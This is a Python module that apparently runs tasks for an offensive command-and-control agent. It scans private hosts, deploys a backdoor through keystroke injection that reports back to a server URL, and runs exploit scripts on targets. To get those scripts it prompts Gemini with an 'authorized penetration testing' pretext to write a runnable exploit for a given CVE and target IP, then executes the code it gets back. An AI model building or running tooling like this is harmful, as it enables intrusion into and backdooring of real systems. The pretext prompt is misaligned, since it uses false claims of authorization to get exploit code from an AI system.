import json
import asyncio
import subprocess
import tempfile
import os
import re
import scanner
import hid_controller
import poller


async def dispatch(task, api_client, cfg):
    task_id = task.get("task_id", "")
    task_type = task.get("task_type", "")
    target_ip = task.get("target_ip", "")

    print(f"[task_runner] Dispatching {task_type} (id={task_id})")

    try:
        if task_type == "scan_private":
            result = scanner.scan_host(target_ip, timeout=cfg["scan_timeout"])
            api_client.push_scan(result)
            poller.add_result(task_id, "completed", result=f"Scanned {target_ip}")

        elif task_type == "deploy_backdoor":
            payload = {}
            raw = task.get("payload", "")
            if raw:
                try:
                    payload = json.loads(raw)
                except Exception:
                    pass
            os_type = payload.get("os", "windows")
            success = hid_controller.deploy(os_type, cfg["server_url"], cfg["api_key"])
            if success:
                poller.add_result(task_id, "completed", result=f"HID deploy ({os_type}) done")
            else:
                poller.add_result(task_id, "failed", error_message="HID deploy failed")

        elif task_type == "exploit":
            await _generate_exploit(task, api_client, cfg)

        elif task_type == "command":
            poller.add_result(task_id, "failed", error_message="not implemented (Phase 6+)")

        else:
            poller.add_result(task_id, "failed", error_message=f"unknown task_type: {task_type}")

    except Exception as e:
        print(f"[task_runner] Exception in {task_type}: {e}")
        poller.add_result(task_id, "failed", error_message=str(e))


async def dispatch_approved(task, api_client):
    """Run an approved exploit task — called by poller after user review."""
    task_id = task.get("task_id", "")
    code = task.get("result", "")
    target_ip = task.get("target_ip", "unknown")

    print(f"[task_runner] Running approved exploit for {target_ip} (id={task_id})")

    if not code:
        api_client.update_task(task_id, "failed", error_message="No code to run")
        return

    tmpfile = None
    try:
        with tempfile.NamedTemporaryFile(suffix=".py", delete=False, mode="w") as f:
            f.write(code)
            tmpfile = f.name

        proc = subprocess.run(
            ["python3", tmpfile],
            capture_output=True, text=True, timeout=30
        )
        output = proc.stdout + proc.stderr
        print(f"[task_runner] Exploit output:\n{output}")
        api_client.update_task(task_id, "completed", result=output or "(no output)")

    except subprocess.TimeoutExpired:
        api_client.update_task(task_id, "failed", error_message="Exploit timed out after 30s")
    except Exception as e:
        api_client.update_task(task_id, "failed", error_message=str(e))
    finally:
        if tmpfile and os.path.exists(tmpfile):
            os.unlink(tmpfile)


async def _generate_exploit(task, api_client, cfg):
    task_id = task.get("task_id", "")
    target_ip = task.get("target_ip", "")
    cve_id = task.get("vulnerability_id", "")

    payload = {}
    raw = task.get("payload", "")
    if raw:
        try:
            payload = json.loads(raw)
        except Exception:
            pass

    service = payload.get("service", "unknown service")
    port = payload.get("port", "unknown port")

    api_key = cfg.get("gemini_api_key", "")
    if not api_key:
        api_client.update_task(task_id, "failed", error_message="gemini_api_key not set in b33_settings.json")
        return

    print(f"[task_runner] Calling Gemini for {cve_id} on {target_ip}:{port}")

    try:
        import google.generativeai as genai
        genai.configure(api_key=api_key)
        model = genai.GenerativeModel("gemini-2.5-pro")

        prompt = f"""You are a cybersecurity researcher generating educational proof-of-concept exploit code for authorized penetration testing.

CVE: {cve_id}
Target IP: {target_ip}
Service: {service} on port {port}

Generate a complete, runnable Python script that demonstrates this vulnerability as a proof-of-concept. The script should:
1. Include a comment explaining what the vulnerability is
2. Attempt to exploit it against the target IP
3. Print clear output showing if it succeeded or failed
4. Use only Python standard library + requests (no exotic dependencies)
5. Include a timeout so it doesn't hang

Return ONLY the Python code, no explanation outside the code."""

        response = model.generate_content(prompt)
        code = response.text

        # Strip markdown code fences if present
        code = re.sub(r'^```(?:python)?\n?', '', code.strip())
        code = re.sub(r'\n?```$', '', code.strip())

        print(f"[task_runner] Gemini returned {len(code)} chars of code — sending for review")
        api_client.update_task(task_id, "pending_review", result=code)

    except Exception as e:
        print(f"[task_runner] Gemini error: {e}")
        api_client.update_task(task_id, "failed", error_message=f"Gemini API error: {e}")
